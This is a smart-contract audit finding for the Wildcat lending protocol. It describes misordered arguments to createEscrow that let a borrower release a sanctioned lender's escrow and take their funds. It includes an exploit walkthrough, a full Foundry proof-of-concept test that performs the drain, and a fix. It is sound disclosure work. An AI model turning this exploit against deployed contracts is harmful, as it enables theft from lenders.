# Original link
https://github.com/code-423n4/2023-10-wildcat-findings/issues/68
# Lines of code

https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatSanctionsSentinel.sol#L96-L97
https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketBase.sol#L173-L174
https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L166-L170


# Vulnerability details

## Impact

The `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentially creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.

The execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the the `accountAddress` is sanctioned and if it is, and escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order. 

That means wether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.

## Proof of Concept

Consider this scenario to illustrate how the issue can be exploited.

1. Bob The Borrower creates a market.
2. Bob authorizes Larry The Lender as a lender in the created market.
3. Larry deposits funds into the market
4. Larry gets sanctioned in Chainalysis
5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.
7. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)` 
8. Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`
9. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` - and gains access to all of Larry's assets.

Now, let's delve into the specifics and mechanics of the vulnerability.

The `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.

```solidity
//@audit                                                     Larry
//@audit                                                       ↓
function _blockAccount(MarketState memory state, address accountAddress) internal {
  Account memory account = _accounts[accountAddress];
  // ...
  account.approval = AuthRole.Blocked;
  // ...
  account.scaledBalance = 0;
  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
	accountAddress, //@audit ← Larry
	borrower,       //@audit ← Bob
	address(this)
  );
  // ...
  _accounts[escrow].scaledBalance += scaledBalance;
  // ...
}
```

In the code snippet, notice the order of arguments passed to `createEscrow()`:

```solidity
createEscrow(accountAddress, borrower, address(this));
```

However, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:

```solidity
function createEscrow(
	address borrower, //@audit ← Larry
	address account,  //@audit ← Bob
	address asset
) public override returns (address escrowContract) {
  // ...
  // @audit                        ( Larry  ,   Bob  , asset)
  // @audit                            ↓         ↓       ↓
  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);
  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();
  // ...
}
```

The `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:

```solidity
constructor() {
  sentinel = msg.sender;  
  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();
//     ↑        ↑       ↑   
//(  Larry ,   Bob  , asset) are the params fetched here. @audit
}
```

However, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert:

```solidity
function canReleaseEscrow() public view override returns (bool) {
	//@audit                                                 Larry      Bob
	//                                                         ↓         ↓
	return !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);
}
```

The misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.

```solidity
//@audit                       Larry              Bob
//                               ↓                 ↓
function isSanctioned(address borrower, address account) public view override returns (bool) {
 return
   !sanctionOverrides[borrower][account] && // true
   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false
}
```

Thus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:

```solidity
function releaseEscrow() public override {
  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();

  uint256 amount = balance();
  
  //@audit                 Bob   Larry's $
  //                        ↓       ↓
  IERC20(asset).transfer(account, amount);

  emit EscrowReleased(account, asset, amount);
}
```

After this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.

Below is a PoC demonstrating how to execute the exploit.

To proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:

```solidity
import 'src/WildcatSanctionsEscrow.sol';

import "forge-std/console2.sol";
```

Add the following test `test/market/WildcatMarketConfig.t.sol` as well:

```solidity
function test_borrowerCanStealSanctionedLendersFunds() external {
  vm.label(borrower, "bob"); // Label borrower for better trace readability

  // This is Larry The Lender
  address larry = makeAddr("larry");

  // Larry deposists 10e18 into Bob's market
  _deposit(larry, 10e18);

  // Larry's been a bad guy and gets sanctioned
  sanctionsSentinel.sanction(larry);

  // Larry gets nuked by the borrower
  vm.prank(borrower);
  market.nukeFromOrbit(larry);

  // The vulnerable escrow in which Larry's funds get moved
  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));
  vm.label(vulnerableEscrow, "vulnerableEscrow");

  // Ensure Larry's funds have been moved to his escrow
  assertEq(market.balanceOf(larry), 0);
  assertEq(market.balanceOf(vulnerableEscrow), 10e18);

  // Malicious borrower is able to release the escrow due to the vulnerability
  vm.prank(borrower);
  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();

  // Malicious borrower has all of Larry's tokens
  assertEq(market.balanceOf(borrower), 10e18);

  // The borrower authorizes himself as a lender in the market
  _authorizeLender(borrower);

  // Queue withdrawal of all funds
  vm.prank(borrower);
  market.queueWithdrawal(10e18);

  // Fast-forward to when the batch duration expires
  fastForward(parameters.withdrawalBatchDuration);
  uint32 expiry = uint32(block.timestamp);

  // Execute the withdrawal
  market.executeWithdrawal(borrower, expiry);

  // Assert the borrower has drained all of Larry's assets
  assertEq(asset.balanceOf(borrower), 10e18);
}
```

Run the PoC like this:

```sh
forge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv
```

## Tools Used

Manual review
## Recommended Mitigation Steps

1. Fix the order of parameters in `WildcatSanctionsSentinel#createEscrow(borrower, account, asset)`:

```diff
  function createEscrow(
-   address borrower,
+   address account,
-   address account,
+   address borrower,
    address asset
  ) public override returns (address escrowContract) {
```





## Assessed type

Error